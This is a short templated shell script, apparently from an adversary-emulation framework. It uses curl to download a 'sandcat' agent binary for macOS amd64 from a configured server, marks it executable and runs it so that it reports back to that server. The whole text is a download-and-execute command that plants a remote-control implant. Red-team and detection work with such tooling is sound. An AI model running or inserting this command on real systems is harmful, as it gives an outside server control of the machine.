server="#{app.contact.http}";
curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > #{agents.implant_name};
chmod +x #{agents.implant_name};
./#{agents.implant_name} -server $server -v
